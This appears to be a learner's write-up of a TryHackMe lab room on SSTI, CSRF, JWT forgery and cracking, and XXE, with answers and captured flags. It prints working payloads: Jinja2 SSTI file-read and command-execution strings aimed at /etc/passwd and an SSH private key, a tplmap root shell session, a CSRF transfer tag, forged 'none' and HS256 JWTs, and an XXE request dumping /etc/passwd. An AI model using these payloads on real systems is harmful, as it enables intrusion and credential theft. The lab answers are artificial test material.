# ZTH: Obscure Web Vulns

Learn and practice exploiting a range of unique web vulnerabilities such as SSTI, CSRF, JWT and XXE.

[ZTH: Obscure Web Vulns](https://tryhackme.com/room/zthobscurewebvulns)

## Topic's

- Server Side Template Injection (SSTI)
- Cross Site Request Forgery (CSRT)
- Json Web Token (JWT)
- XML External Entity Injection (XXE)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Introduction

There are quite a lot of vulnerabilities that affect web applications. This leads to the problem of having quite a bit of material to cover, so it's fair to only cover the bigger/more common vulnerabilities in lieu of the smaller/less common vulnerabilities. This room is dedicated to some of the smaller web vulnerabilities, that may not be large enough to get a room on this site but are still worth knowing about.

The vulnerabilities that will be discussed are:

- SSTI
- CSRF
- JWT
- XXE

1. Read the Intro.

`No answer needed`

## Task 2 Methodology

This room will be divided into sections, each section talking about a specific vulnerability. The sections will follow this format: an introduction on what the vulnerable thing is, what the vulnerability(s) is/are(their may be multiple tasks on this), a guided exploitation in which I show pictures of how it's exploited, and finally a virtual machine where you will be asked to exploit it and collect a flag.

Since this room is divided into sections that don't follow one another, you can do this room in any order you please.

1. Read the above!

`No answer needed`

## Task 3 [Section 1 - SSTI] - What is SSTI

A template engine allows developers to use static HTML pages with dynamic elements. Take for instance a static profile.html page, a template engine would allow a developer to set a username parameter, that would always be set to the current user's username

Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.

For example take the code

![](https://i.imgur.com/GAO1km1.png)

This introduces a vulnerability, as it allows a hacker to inject template code into the website. The effects of this can be devastating, from XSS, all the way to RCE.

Note: Different template engines have different injection payloads, however usually you can test for SSTI using `{{2+2}}` as a test.

1. Read the above.

`No answer needed`

## Task 4 [Section 1 - SSTI] - Manual exploitation of SSTI.

Turning the code earlier into a full flask application, gives us this page. It takes a prompt for a name, and then returns `Hello <name>!`.

![](https://i.imgur.com/j0FJBw5.png)

Fortunately, we don't have to do much recon as we already know this is vulnerable to SSTI, lets try injecting some basic template code

![](https://i.imgur.com/CdzYeHS.png)

Boom! That's template injection. We can use the wonderful repository [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection), to find some payloads for flask's template engine. The repo says we can use the code

`{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}` to read files on the server. Effectively all that payload does is load the file object in python, from there we can use basic file operations. Let's try to read /etc/passwd using this method

![](https://i.imgur.com/a7RphqV.png)

We have LFI! Unfortunately(or fortunately depending on how you view it), that is not the extent of this vulnerability. The same repo, also includes a payload for remote code execution.

We can use the code `{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}` to execute commands on the server. All that payload does is import the os module, and run a command using the popen method.

![](https://i.imgur.com/XTDPJSX.png)

From there, an attacker has already won, they can use this ability to gain a shell on the server.

1. How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)

`{{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}`

2. What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)

`{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/home/test/.ssh/id_rsa).read()}}`

## Task 5 [Section 1 - SSTI]: Automatic Exploitation of SSTI

Fortunately, we don't have to go searching for payloads to see how we can use SSTI to our advantage, because there is a tool known as Tplmap that does that for us! The tool can be found [here](https://github.com/epinna/tplmap).

Note: use python2 to install the requirements. `python2 -m pip`

The basic syntax for tplmap is different depending on whether you're using get or post

|      |                                    |     |
| ---- | ---------------------------------- | --- |
| GET  | `tplmap -u <url>/?<vulnparam>`     |
| POST | `tplmap -u <url> -d '<vulnparam>'` |

Since our code operates via a form, the post syntax will be used.

![](https://i.imgur.com/416wOwX.png)

From there we can effectively do everything we did in the manual exploitation task, from a command line. Let's try running id using tplmap.

![](https://i.imgur.com/eqUQETT.png)

Victory!

1. How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".

`tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'`

## Task 6 [Section 1 - SSTI]: Challenge

I've created a vulnerable machine for you to test your SSTI skills on! I've placed a flag in /flag aswell, good luck and have fun!

```
kali@kali:/opt/tplmap$ ./tplmap.py -u http://10.10.223.70/ -d 'name' --os-shell
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux2
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux2 $ whoami
root
posix-linux2 $ pwd
/root
posix-linux2 $ find / -type f -name "*flag*"
/flag
posix-linux2 $ cat /flag
cooctus
```

1. What is the flag?

`cooctus`

## Task 7 [Section 2 - CSRF]: What is CSRF

Cross Site Request Forgery, known as CSRF occurs when a user visits a page on a site, that performs an action on a different site. For instance, let's say a user clicks a link to a website created by a hacker, on the website would be an html tag such as <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> which would change the account email on the vulnerable website to "pwned@evil-user.net". CSRF works because it's the victim making the request not the site, so all the site sees is a normal user making a normal request.

This opens the door, to the user's account being fully compromised through the use of a password reset for example. The severity of this cannot be overstated, as it allows an attacker to potentially gain personal information about a user, such as credit card details in an extreme case.

1. Read the above.

`No answer needed`

## Task 8 [Section 2 - CSRF]: Manual exploitation of CSRF

Let's take an example application

![](https://i.imgur.com/P6oMiiZ.png)

It seems simple enough, As user bob, I can send funds to either Bob or Alice with any of the available balance in my account. Let's take a closer look at the request in burp.

![](https://i.imgur.com/RYEnGqy.png)

This is looking good, parameters we can customize and a session cookie that is automatically set. Everything seems vulnerable to CSRF. Let's try and make a vulnerable site. Putting `<img src="http://localhost:3000/transfer?to=alice&amount=100">` into an html file and using SimpleHTTPServer to host it should change's Alice's balance by 100, Let's see if it does!

![](https://i.imgur.com/wUUlax4.png)

Woohoo, CSRF exploited!

1. Read the above.

`No answer needed`

## Task 9 [Section 2 - CSRF]: Automatic Explotation

Once again, there is a nice automated scanner, which tests if a site is vulnerable to CSRF. this tool is known as xsrfprobe and can be install via pip using `pip3 install xsrfprobe`. This will only work using python 3(I mean come on it's 2020 you should be using python 3 anyway).

The syntax for the command is `xsrfprobe -u <url>/<endpoint>`. Let's run this against our vulnerable site.

![](https://i.imgur.com/5gx7k8D.png)

The output confirms that we've managed to manually exploiting it and that the site is vulnerable to csrf.

```
kali@kali:~/CTFs/tryhackme/ZTH Obscure Web Vulns$ xsrfprobe -h

    XSRFProbe, A Cross Site Request Forgery Audit Toolkit

usage: xsrfprobe -u <url> <args>

Required Arguments:
  -u URL, --url URL     Main URL to test

Optional Arguments:
  -c COOKIE, --cookie COOKIE
                        Cookie value to be requested with each successive request. If there are multiple cookies, separate them with commas. For example: `-c PHPSESSID=i837c5n83u4, _gid=jdhfbuysf`.
  -o OUTPUT, --output OUTPUT
                        Output directory where files to be stored. Default is the output/ folder where all files generated will be stored.
  -d DELAY, --delay DELAY
                        Time delay between requests in seconds. Default is zero.
  -q, --quiet           Set the DEBUG mode to quiet. Report only when vulnerabilities are found. Minimal output will be printed on screen.
  -H HEADERS, --headers HEADERS
                        Comma separated list of custom headers you'd want to use. For example: ``--headers "Accept=text/php, X-Requested-With=Dumb"``.
  -v, --verbose         Increase the verbosity of the output (e.g., -vv is more than -v).
  -t TIMEOUT, --timeout TIMEOUT
                        HTTP request timeout value in seconds. The entered value may be either in floating point decimal or an integer. Example: ``--timeout 10.0``
  -E EXCLUDE, --exclude EXCLUDE
                        Comma separated list of paths or directories to be excluded which are not in scope. These paths/dirs won't be scanned. For example: `--exclude somepage/, sensitive-dir/,
                        pleasedontscan/`
  --user-agent USER_AGENT
                        Custom user-agent to be used. Only one user-agent can be specified.
  --max-chars MAXCHARS  Maximum allowed character length for the custom token value to be generated. For example: `--max-chars 5`. Default value is 6.
  --crawl               Crawl the whole site and simultaneously test all discovered endpoints for CSRF.
  --no-analysis         Skip the Post-Scan Analysis of Tokens which were gathered during requests
  --malicious           Generate a malicious CSRF Form which can be used in real-world exploits.
  --skip-poc            Skip the PoC Form Generation of POST-Based Cross Site Request Forgeries.
  --no-verify           Do not verify SSL certificates with requests.
  --display             Print out response headers of requests while making requests.
  --update              Update XSRFProbe to latest version on GitHub via git.
  --random-agent        Use random user-agents for making requests.
  --version             Display the version of XSRFProbe and exit.
```

1. What parameter allows us to generate a POC(actual exploit)

`--malicious`

## Task 10 [Section 2 - CSRF]: Challenge?

Due to the nature of CSRF, I can't really give you a challenge to complete with a flag. So I'll give you one without a flag! Your challenge is to make a website vulnerable to CSRF, and exploit it.

1. Earn that cookie!

`No answer needed`

## Task 11 [Section 3 - JWT] - Intro

Json Web Token's are a fairly interesting case, as it isn't a vulnerability itself. Infact, it's a fairly popular, and if done right very secure method of authentication. The basic structure of a JWT is this, it goes "header.payload.secret", the secret is only known to the server, and is used to make sure that data wasn't changed along the way. Everything is then base64 encoded. so an example JWT token would look like `"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"`

Meaning that if we are able to control the secret, we can effectively control the data. To be able to do this we have to understand how the secret is calculated. This requires knowing the structure of the header, a typical JWT header looks like this `{"typ":"JWT","alg":"RS256"}`. We're interested in the alg field. RS256 uses a private RSA key that's only available to the server, so that's not vulnerable. However, We can change that field to HS256, This is calculated using the server's public key, which in certain circumstances we may have access too.

1. Read the above.

`No answer needed`

## Task 12 [Section 3 - JWT]: Manual JWT Exploitation

We start off with a basic application

![](https://i.imgur.com/ygQg3D8.png)

With a JWT, and a JWT verifier. Sending it garbage results in a failure, so let's try decoding the JWT.

![](https://i.imgur.com/RItwOM3.png)

Decoding the JWT gives us our header, payload, and a bunch of garbage which is the secret.

![](https://i.imgur.com/wgGLkHA.png)

Unfortunately it seems the algorithm is RS256, which doesn't have any vulnerabilities. Fortunately for us though, this server leaves its public key lying around, which means we can change the algorithm and sign a new secret! The first step is to change the algorithm in the header to HS256, and then re encode it in base64. Our new JWT is `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0IiwiaWF0IjoxNTg1MzIzNzg0LCJleHAiOjE1ODUzMjM5MDQsImRhdGEiOnsiaGVsbG8iOiJ3b3JsZCJ9fQ.FXj9F1jIXlhMyoQAo5-XPOiZeP4Ltw5XXZGqgX49tKkYUOeirOXUDgWL4bqP9nRXIODqOByqS_9O11nQN5bC_LTpfBWG2WZXg0tKIDAbKTxVkrytXBmOkP1qRK_Apv-CQs-mouuS1we8SHYShW_r4DEj0qAF3dsWVVzbRWNMH4Oc_odHNogv00dVlABcxMyXFpNJbeRS6-GCS-A4SFM32gMv_mkfkXrQPdejKDU_sKZrD5VVAmDlu0BainIvD28l8uV3OCc37shtPW0TKoIwUXmGsFYouKqk-h0dz4aTBLKJk7L64XdrA7ts1oOtzk8KqV6gnqXDXUNkzDX3qd9JKA`

The next step is to convert the public key to hex so openssl will use it.

![](https://i.imgur.com/ZoOsCaO.png)

(Explanation: a is the file with the public key, `xxd -p` turns the contents of a file to hex, and `tr` is there to get rid of any newlines)

The next step is to use openssl to sign that as a valid HS256 key.

![](https://i.imgur.com/tYWFci2.png)

Everything is going just fine so far!. The final step is to decode that hex to binary data, and reencode it in base64, luckily python makes this really easy for us.

![](https://i.imgur.com/XfR9H8t.png)

That's our final secret, now we just put that where the secret should go, and the server should accept it.

So our final JWT would be `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<payload>.<new secret>`

![](https://i.imgur.com/mdsgxHx.png)

1. Read the above.

`No answer needed`

## Task 13 [Section 3 - JWT] - Automatic JWT exploitation

Due to the fact that JWT tokens often expire, there's no real way to guarantee that finding the public key is possible, and that there is no way to keep the data portion of the JWT consistent, there aren't tools avaliable that automatically exploit JWT vulnerabilities. JWT vulns have to be exploited on a case by case basis.

Now that doesn't mean you can't write a script that does everything automatically for a specific website that you know is vulnerable, it's just that by the time you succeed in doing that, you could have already exploited the vulnerability.

1. Read the above.

`No answer needed`

## Task 14 [Section 3 - JWT]: Challenge!

The challenge is effectively the exact same application shown in the Manual exploitation section. If you succeed in exploiting it, you will get the flag!

The public key can be found at /public.pem.

Generated JWT tokens will also expire after a certain amount of time, so if you don't get it the first try, try doing it faster!

Note: some recommended reading [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

- https://github.com/Sjord/jwtdemo
- https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
- https://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php
- http://rootinthemiddle.org/write-up-jrr-token-lehack-2019/

```
kali@kali:~/CTFs/tryhackme/ZTH Obscure Web Vulns$ sudo /opt/TokenBreaker/RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA1NjEyNzMzLCJleHAiOjE2MDU2MTI4NTMsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.iuAsaEsjF04s6mUv4IA5BZq634fX7-GAC4Jrf-gXIsTRX_5z9oaVfP7ngkdMIc1WgIKKQKvWt8h_Nfw1XfnGXQFqFUGJcIkQvqWyVwn3ph3Hi-KPAzMxBGNDn2RMBL1mvMh6-Kkl5PL8h9jPXVQKzYIiErGmql9ZCbXI4m7sfjXeDDxlo-0AubPFeZ6dzL8SYPhgH7JOp7k33hTJplP2IBWZ3N8wJAktntjdF59fGgutSomI0CRLH2JG5LNAukuqgMg8Oc4ajpus4LcssMHMvUy4w13fw4ESjJuF5wCBxrqiwaQcvnQMXkBzpDGqIWukHeb4RvDhPQ-Otw6i265kqQ -p public.pem
 ___  ___   _     _         _  _ __  __   _   ___
| _ \/ __| /_\   | |_ ___  | || |  \/  | /_\ / __|
|   /\__ \/ _ \  |  _/ _ \ | __ | |\/| |/ _ \ (__
|_|_\|___/_/ \_\  \__\___/ |_||_|_|  |_/_/ \_\___|

[*] Decoded Header value: {"typ":"JWT","alg":"RS256"}
[*] Decode Payload value: {"iss":"Paradox","iat":1605612733,"exp":1605612853,"data":{"pingu":"noots"}}
[*] New header value with HMAC: {"typ":"JWT","alg":"HS256"}
[<] Modify Header? [y/N]: N
[<] Enter Your Payload value: {"iss":"Paradox","iat":1605612733,"exp":1605612853,"data":{"pingu":"noots"}}
[+] Successfully Encoded Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA1NjEyNzMzLCJleHAiOjE2MDU2MTI4NTMsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.eSveNHcSU_hw3EGEAyEIIBugqyRtR_R8375Q1lQ7RmU
```

```
Good Job! stdClass Object
(
    [iss] => Paradox
    [iat] => 1605612733
    [exp] => 1605612853
    [data] => stdClass Object
        (
            [pingu] => noots
        )

)
nootnootisthebestflag is the flag
```

1. What is the flag?

`nootnootisthebestflag`

## Task 15 [Section 3.5 - JWT]: Intro

In addition to the previous vulnerability, certain JWT libraries have another devastating vulnerability. There is actually three possible algorithms, two of them RS256 and HS256 which we have already studied. There is a third algorithm, known as None. According to the official JWT RFC the None algorithm is used when you still want to use JWT, however there is other security in place to stop people from spoofing data.

Unfortunately certain JWT libraries clearly didn't read the RFC, allowing a vulnerability where an attacker can switch to the None algorithm, in the same way one switches to RS256 to HS255, and have the token be completely valid without even needing to calculate a secret.

1. Remember to read the RFC when your developing a library.

`No answer needed`

## Task 16 [Section 3.5: JWT]: Manually exploitating the JWT None vuln

We start off with a simple login application.

![](https://i.imgur.com/nfztNWp.png)

Logging in gives us a user screen, as well as a JWT token.

![](https://i.imgur.com/yAqR7yp.png)

Let's examine that token in the wonderful site [jwt.io](https://jwt.io/)

![](https://i.imgur.com/7uY7xa1.png)

(Very nice site btw, definitely recommend for all your jwt needs)

Now let's try changing the alg field to none, get rid of the signature, and change the role to admin. That leaves us with this final jwt token.

`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNTg1MzQ1ODg0MjA0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTg1MzQ1ODg0fQ.`

The interesting this is we still need is a second . to denote that a signature would be there, even though we don't put anything after it. Let's try popping that token in where the cookie is supposed to be.

![](https://i.imgur.com/gj7YxlK.png)

Boom! JWT exploited.

1. Read the above.

`No answer needed`

## Task 17 [Section 3.5: JWT] - Automatic Exploitation

There is no tool that can check the library, get the token, and make sure this is vulnerable. Therefore, you're gonna have to do this manually. The header for each JWT none vuln though is the same, which can help you out. Here's the header

`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`

Which decodes to {"type": "JWT", "alg": "none"}

1. Read the above

`No answer needed`

## Task 18 [Section 3.5 - JWT]: Challenge

You know the drill, you're given a vulnerable application and there's a flag once you become admin. Good luck!

1. What is the flag?

`{"auth":1605611903270,"agent":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0","role":"admin","iat":1605611903}`

```
 Hello, longz! You have logged in as admin!
flag=supernootnoot
```

`supernootnoot`

## Task 19 [Section 4: XXE] - Intro

Certain applications will occasionally have you post an XML document to do an action. Improper handling of these XML documents can lead to what's known as XML External Entity Injection(XXE). XXE is when an attacker is able to use the ENTITY feature of XML to load resources from outside the website directory, for example XXE would allow an attack to load the contents of /etc/passwd.

Since the application doesn't necessarily have to return data, you may not be able to get the contents of the external entity; however, that doesn't mean all hope is lost. If you're really lucky you may be able to use the php expect module to get RCE anyway.

1. Read the above.

`No answer needed`

## Task 20 [Section 4 - XXE]: Manual exploitation of XXE

Once again we start off with a simple login application

![](https://i.imgur.com/50Mp5gB.png)

Let's fill it with random data and examine the request in burp.

![](https://i.imgur.com/E3i4wbV.png)

It seems all of our data is being put into XML format, and is being posted to "process.php". Let's send the request and see what we get.

![](https://i.imgur.com/IBri053.png)

This is very promising, because it returns the output of one of the XML fields, meaning we may be able to view the contents of files on the filesystem. Further playing with the requests, tells me that it returns the email field.

![](https://i.imgur.com/Jy6ZDSa.png)

Let's try creating an entity that has the value of /etc/passwd. We can do this by once again using the amazing repository [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe).

![](https://i.imgur.com/hATuDB6.png)

We have XXE! Typically this is the best case scenario, we can get the output of files on the system, and from that we could enumerate further. There is however, a chance that we could get RCE from XXE if the php expect module is loaded. Let's try doing that.All expect is a php module that allows you to run commands.

![](https://i.imgur.com/tlbDd7j.png)

Fortunately for us, we can use "expect://". Even with XXE this module especially is not guaranteed, ,meaning that a user has to manually install it, so don't immediately go for the RCE.

1. Read the above.

`No answer needed`

## Task 21 [Section 4 - XXE]: Automatic exploitation

XXE can't really be automatically exploited, as you can't guarantee xml data will be the same, and which payload will or won't work. By the time you figure out that it's vulnerable and make a script to exploit it, you could have a reverse shell or LFI already using burp.

1. Read the above.

`No answer needed`

## Task 22 [Section 4 - XXE]: Challenge

This challenge will ask you some basic questions on the system, and the application is vulnerable to XXE. Good luck!

```
POST /process.php HTTP/1.1
Host: 10.10.226.160
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.226.160/
Content-Type: text/plain;charset=UTF-8
Content-Length: 207
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root><name>aa</name><tel>aa</tel><email>&xxe;</email><password>aa</password></root>
```

```
HTTP/1.1 200 OK
Date: Mon, 16 Nov 2020 09:43:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1641
Connection: close
Content-Type: text/html; charset=UTF-8

Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
para:x:1000:1000:para:/home/para:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
 is already registered!
```

1. How many users are on the system?

`31`

2. What is the name of the user with a UID of 1000?

`para`

## Task 23 [Bonus Section] - JWT once again

Recall that JWT HS256 is calculated using a secret.The exact format of the calculation is

`HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)`

Therefore, it stands to reason that, since we have the full jwt token, and the header and payload, the secret can be brute forced to obtain the full JWT token. If the secret can be brute forced then the attacker could sign his own JWT tokens.

1. Read the above.

```
cat jwt.txt | xxd -p | tr -d "\\n"
7373682d727361204141414142334e7a61433179633245414141414441514142414141426751444f374754784946762f53455671656c7752314f72437663445273614f59757955334a7464614678763149504d787038736f533030374b39656551795a767053695537796e4968774a7353726668504839505776705046393337507065382b4c58356535622b354673464d6f567736646b77575732664e496d6c4463586632373376442f37625452422b53426f2b55634275495233314552704d2b393078434e4b762b48455262697131547a6e6e425a584a31365078753256426653434c46345a6a504f3442464736324951516d6b4b316533763343656946326238742b6c6253324c725543624c4b64505976684836727a6f7a314c6f5077764e4f7279546976676a4468732f784746425933525468414b42694c4a58544f417834714c6634464d456f30437238793647427a336d744c6a2f554a7a4e6374776c6c766a344e77566744706f5471743145734d412b64314251596c4f35584634436d6847624b7951616d766772587a6441554b674531735a316f656c38344133504f43724f474a646e6750524d39456b55574939483636313953566d6f686a756b52665752624d5161557a316d78437a385355444a6c475a5773396b4a674b65632f4c71676a794a78483656563341724f4b4d646f61525133424e77484d566d4f4e57465a564f766a2b517a58745357642b756241644f3448644e77762f6568556a3836517a733d206b616c69406b616c690a

echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9." | openssl dgst -sha256 -mac HMAC -macopt hexkey:7373682d727361204141414142334e7a61433179633245414141414441514142414141426751444f374754784946762f53455671656c7752314f72437663445273614f59757955334a7464614678763149504d787038736f533030374b39656551795a767053695537796e4968774a7353726668504839505776705046393337507065382b4c58356535622b354673464d6f567736646b77575732664e496d6c4463586632373376442f37625452422b53426f2b55634275495233314552704d2b393078434e4b762b48455262697131547a6e6e425a584a31365078753256426653434c46345a6a504f3442464736324951516d6b4b316533763343656946326238742b6c6253324c725543624c4b64505976684836727a6f7a314c6f5077764e4f7279546976676a4468732f784746425933525468414b42694c4a58544f417834714c6634464d456f30437238793647427a336d744c6a2f554a7a4e6374776c6c766a344e77566744706f5471743145734d412b64314251596c4f35584634436d6847624b7951616d766772587a6441554b674531735a316f656c38344133504f43724f474a646e6750524d39456b55574939483636313953566d6f686a756b52665752624d5161557a316d78437a385355444a6c475a5773396b4a674b65632f4c71676a794a78483656563341724f4b4d646f61525133424e77484d566d4f4e57465a564f766a2b517a58745357642b756241644f3448644e77762f6568556a3836517a733d206b616c69406b616c690a

python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('c3e88a85efc60857300175f1ce32c80ceb42d56c6473bcbffbd3603cf71a6a74')).replace('=','')\")"

eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjAzNzQzNDIxLCJleHAiOjE2MDM3NDM1NDEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.w-iKhe_GCFcwAXXxzjLIDOtC1Wxkc7y_-9NgPPcaanQ

JWTconverter.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjgyMTAyOCwiZXhwIjoxNTYyODIxMTQ4LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.XlgqI4zNlEsjzGBslj-Dee5C2_WLpDSOVdjFXR4FO4TOx4RMth9mGPdIIeTQZbFyiVoQ9jkX0O3czWTr52y8qB7iJOqDKzwBoi1NPD_xoihFKHrnLxOmR1yLyjXwzlIHURRZ7f_DpPuwqnOYRbjSen4cMVBz0UhgGYe4DNcSjxNmaV2Ksfwd2exTC61g22szQIa_ISyJYU0OxIN2_Ad_XsPpmc_AQ0QcxyYCDcCEkByWUD9adCIBWlrdQhsjXASfEuP5olmvI4Znn2L33fSpAOW1G5DqozTQxyctOXvNuNm3ql9DvE5Wqntr5Z-vs6aQj32uKrVMSutayxuExVH_lQ
```

```
{
 "typ": "JWT",
 "alg": "RS256"
},
{
 "iss": "Paradox",
 "iat": 1603741977,
 "exp": 1603742097,
 "data": {
  "pingu": "noots"
 }
}
```

``

## Task 24 [Bonus Section] - Bruteforcing JWT tokens.

To brute force these secrets we'll be using a tool called jwt-cracker. The syntax of jwt-cracker isjwt-cracker <token> [alphabet] [max-length] where alphabet and max-length are optional parameters.

Explanation of Paramaters:

|            |                                                                                                  |
| ---------- | ------------------------------------------------------------------------------------------------ |
| Token      | The HS256 JWT token                                                                              |
| Alphabet   | The alphabet that the cracker will use to check passwords(default: "abcdefghijklmnopqrstuvwxyz") |
| max-length | The max expected length of the secret(12 by default)                                             |

Using an example token from jwt.io lets see how long it takes to crack.

![](https://i.imgur.com/Ov20ZaE.png)

In 4 seconds, we've tried 300000 passwords and cracked the secret!

1. Read the above

`No answer needed`

## Task 25 [Bonus Section]: Challenge

Given the following token

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE`

1. What is the secret?

```
kali@kali:~/CTFs/tryhackme/ZTH Obscure Web Vulns$ jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE" "abcdefghijklmnopqrstuwxyz" 6
Attempts: 100000
Attempts: 200000
Attempts: 300000
SECRET FOUND: pass
Time taken (sec): 13.312
Attempts: 308791
```

`pass`

## Task 26 Credits

Repos used in the creation of this course:

- [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)
- [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
- [https://github.com/Sjord/jwtdemo/](https://github.com/Sjord/jwtdemo/)

1. Update me..

`No answer needed`
